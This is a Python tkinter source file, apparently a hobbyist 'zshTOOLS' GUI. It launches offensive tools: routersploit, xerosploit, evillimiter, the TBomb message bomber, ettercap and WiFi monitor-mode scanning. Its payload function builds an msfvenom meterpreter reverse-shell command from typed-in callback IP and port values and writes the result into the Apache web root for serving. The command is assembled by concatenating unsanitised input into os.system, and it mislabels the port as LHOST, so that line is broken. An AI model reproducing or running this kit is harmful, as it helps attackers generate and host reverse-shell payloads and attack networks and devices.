import tkinter as tk
from tkinter.ttk import *
import os
import time
import tkinter.messagebox
from pygame import mixer
from PIL import Image
import pyautogui


#root
os.system("figlet MEER TARBANI")
r = tk.Tk()
r.title('zshTOOLS - Meer Tarbani')
ph1 = tk.PhotoImage(file = '/home/redskull-linux/zshtools.png')
r.iconphoto(False, ph1)
mixer.init()

menubar = tk.Menu(r)
More = tk.Menu(menubar, tearoff = 0)

#menu

menubar.add_cascade(label = 'More', menu = More, activebackground='red')

#xterm
def xterm():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("xterm")
More.add_command(label = 'Xterm', command = xterm, activebackground='red')

#info
def onClick():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	tkinter.messagebox.showinfo("INFO","CREATED BY MEER TARBANI\n\nINCLUDES TOOLS...\n\nAIRGEDDON       ROUTERSPLOIT\nXEROSPLOIT	EVILLIMITER\nTBOMB")
More.add_command(label = 'INFO', command = onClick, activebackground='red')


#apache server
def apache():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("systemctl start apache2 && systemctl status apache2")
	tkinter.messagebox.showinfo("INFO", "STARTED SUCCESSFULLY")
	
More.add_command(label = 'Start Apache2', command = apache, activebackground='red')

def sapache():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("systemctl stop apache2 && systemctl status apache2")
	tkinter.messagebox.showinfo("INFO", "STOPPED SUCCESSFULLY")
	
More.add_command(label = 'Stop Apache2', command = sapache, activebackground='red')

#menu2
MSF = tk.Menu(menubar, tearoff = 0)
menubar.add_cascade(label = 'MSF', menu = MSF, activebackground='red')


#payload

#loc = ip
#por = port
#fil = file
#sys = operating system
#thp = tcp/http/https

loc_var=tk.StringVar()
por_var=tk.StringVar()
fil_var=tk.StringVar()
sys_var=tk.StringVar()
thp_var=tk.StringVar()

def exploit():
	os.system("sudo msfvenom -p "+sys_var.get()+"/meterpreter/reverse_"+thp_var.get()+" LHOST="+loc_var.get()+" "+"LHOST="+por_var.get()+" "+"R > /var/www/html/"+fil_var.get())
	print(sys_var.get())
	print(thp_var.get())
	print(loc_var.get())
	print(por_var.get())
	print("/var/www/html/"+fil_var.get())
	tkinter.messagebox.showinfo("INFO","OS : "+sys_var.get()+"\nTHP"+thp_var.get()+"\nIP : "+loc_var.get()+"\nPORT : "+por_var.get()+"\nAt : /var/www/html/\nAs : "+fil_var.get())



def addClick():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	sys_label = tk.Label(r, text = 'Enter OS : ').pack()
	sys_entry = tk.Entry(r, textvariable = sys_var).pack()
	thp_label = tk.Label(r, text = 'Enter THP (tcp/http/https) : ').pack()
	thp_entry = tk.Entry(r, textvariable = thp_var).pack()
	loc_label = tk.Label(r, text = 'Enter IP : ').pack()
	loc_entry = tk.Entry(r, textvariable = loc_var).pack()
	por_label = tk.Label(r, text = 'Enter Port : ').pack()
	por_entry = tk.Entry(r, textvariable = por_var).pack()
	fil_label = tk.Label(r, text = 'Enter File Name : ').pack()
	fil_entry = tk.Entry(r, textvariable = fil_var).pack()
	sub_btn = tk.Button(r, text = 'Go', command = exploit).pack()
	

MSF.add_command(label = 'Payload', command = addClick, activebackground='red')

#console

def console():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("msfconsole -q")
	

MSF.add_command(label = 'CONSOLE', command = console, activebackground='red')




#menu3

SCAN = tk.Menu(menubar, tearoff = 0)
menubar.add_cascade(label = 'SCAN', menu = SCAN, activebackground='red')

#scan networks

def scannet():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	pyautogui.alert("Please Check that MONITOR MODE Should Be STARTED!")
	pyautogui.alert("Press CTRL + C To STOP!")
	os.system("airodump-ng wlan0")

SCAN.add_command(label = 'SCAN Networks', command = scannet, activebackground='red')
SCAN.add_separator()

#nmap

def nmap():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("nmap -h")
	os.system("xterm")
SCAN.add_command(label = 'NMAP', command = nmap, activebackground='red')

#wireshark

def wireshark():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("wireshark")

SCAN.add_command(label = 'WIRESHARK', command = wireshark, activebackground='red')

#ettercap

def ettercap():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("ettercap -G")
	
SCAN.add_command(label = 'ETTERCAP', command = ettercap, activebackground='red')

#monitor mode 

SCAN.add_separator()

def monitoron():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	pyautogui.alert("Disconnect From Any Connected WiFi")
	os.system("airmon-ng start wlan0")
	pyautogui.alert("Monitor Mode STARTED Successfully!")
	
SCAN.add_command(label = 'START monitor', command = monitoron, activebackground='red')

def monitoroff():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("ifconfig wlan0 down")
	os.system("iwconfig wlan0 mode Managed")
	os.system("ifconfig wlan0 up")
	pyautogui.alert("Monitor Mode STOPPED Successfully!")
SCAN.add_command(label = 'STOP monitor', command = monitoroff, activebackground='red')

#music

mixer.music.load("intro.wav")
mixer.music.set_volume(0.9)
mixer.music.play()

#tools
def airgeddon():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("sudo bash /home/redskull-linux/airgeddon/airgeddon.sh")
airgeddonbt = tk.Button(r, text='AIRGEDDON', activebackground='red', width=30, command=airgeddon)
airgeddonbt.pack()

def rsf():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("sudo python3 /home/redskull-linux/routersploit/rsf.py")
rsfbt = tk.Button(r, text='ROUTERSPLOIT', activebackground='red',width=30, command=rsf)
rsfbt.pack()

def xerosploit():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("sudo python3 /home/redskull-linux/xerosploit/xerosploit.py")
xerosploitbt = tk.Button(r, text='XEROSPLOIT', activebackground='red', width=30, command=xerosploit)
xerosploitbt.pack()

def evillimiter():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("sudo python3 /home/redskull-linux/evillimiter/bin/evillimiter")
evillimterbt = tk.Button(r, text='EVILLIMITER', activebackground='red', width=30, command=evillimiter)
evillimterbt.pack()

def tbomb():
	mixer.music.load("toolvol.wav")
	mixer.music.set_volume(0.9)
	mixer.music.play()
	os.system("sudo bash /home/redskull-linux/TBomb/TBomb.sh")
tbombbt = tk.Button(r, text='TBOMB', activebackground='red', width=30, command=tbomb)
tbombbt.pack()
#testing


#exit

exitbt = tk.Button(r, text='EXIT', bg='red', activebackground='black', width=30, command=r.destroy)
exitbt.pack()

#rootexit
r.config(menu = menubar, width=5)
r.mainloop()